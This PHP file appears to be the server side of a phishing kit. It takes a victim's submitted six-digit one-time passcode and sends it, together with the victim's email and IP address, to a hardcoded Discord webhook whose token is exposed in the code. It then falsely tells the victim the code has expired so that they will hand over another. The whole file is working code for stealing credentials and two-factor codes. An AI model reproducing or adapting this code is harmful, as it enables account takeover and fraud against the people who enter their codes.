<?php
session_start();
header('Content-Type: application/json');
error_reporting(E_ALL & ~E_NOTICE);
ini_set('display_errors', '0');
$otp = '';

define('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/1545117386682663083/CU80oo2KU5tKYrC7pxB71DXGR6TWve3lgH6xpw_7DGBS5F1THm_2JbSar_RyUdA-1Tgz');


function sendDiscordMessage(string $webhookUrl, string $message, array $options = []): array
{
    $payload = [
        'content' => $message,
    ];

    // Optional: override username
    if (isset($options['username'])) {
        $payload['username'] = $options['username'];
    }

    // Optional: override avatar
    if (isset($options['avatar_url'])) {
        $payload['avatar_url'] = $options['avatar_url'];
    }

    // Optional: embeds
    if (isset($options['embeds'])) {
        $payload['embeds'] = $options['embeds'];
    }

    $ch = curl_init($webhookUrl);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($payload),
        CURLOPT_HTTPHEADER     => [
            'Content-Type: application/json',
        ],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error    = curl_error($ch);
    curl_close($ch);

    return [
        'success'   => $httpCode >= 200 && $httpCode < 300,
        'status'    => $httpCode,
        'response'  => $response,
        'error'     => $error ?: null,
    ];
}
function sendTelegramMessage($message) {
    global $botToken, $chatId;
    
    // Truncate sensitive data before sending
    $message = substr($message, 0, 1000); // Telegram has message limits
    
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML' // Use HTML for better formatting
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
            'timeout' => 10 // Add timeout
        ],
    ];
    
    $context = stream_context_create($options);
    
    try {
        $response = file_get_contents($url, false, $context);
        if ($response === false) {
            error_log('Failed to send Telegram message');
        }
    } catch (Exception $e) {
        error_log('Telegram send error: ' . $e->getMessage());
    }
}

function getClientIp() {
    $ipKeys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($ipKeys as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            return trim(end($ipList));
        }
    }
    return 'UNKNOWN';
}
$ip = getClientIp();
if (isset($_POST['otp']) && is_scalar($_POST['otp'])) {
    $otp = trim((string) $_POST['otp']);
} else {
    $rawInput = file_get_contents('php://input');
    if ($rawInput !== '') {
        $payload = json_decode($rawInput, true);
        if (is_array($payload) && isset($payload['otp'])) {
            $otp = trim((string) $payload['otp']);
        } elseif (is_string($payload)) {
            $otp = trim((string) $payload);
        } else {
            parse_str($rawInput, $parsed);
            if (isset($parsed['otp'])) {
                $otp = trim((string) $parsed['otp']);
            }
        }
    }
}

$otp = preg_replace('/\D+/', '', $otp);

if (!preg_match('/^\d{6}$/', $otp)) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'message' => 'Please enter a valid 6-digit code.'
    ]);
    exit;
}

$_SESSION['otp'] = $otp;
$userID = isset($_SESSION['userID']) ? $_SESSION['userID'] : 'Unknown';
$message = "OTP Submission Attempt:\nOTP: $otp\nEmail: $userID\nIP: $ip\nTime: "
 . date('Y-m-d H:i:s');
$result = sendDiscordMessage(
    DISCORD_WEBHOOK_URL,
    $message
);

if ($result['success']) {
    echo json_encode([
    'success' => false,
    'message' => 'OTP expired.A new code has been sent to your mobile number.'
]);
}
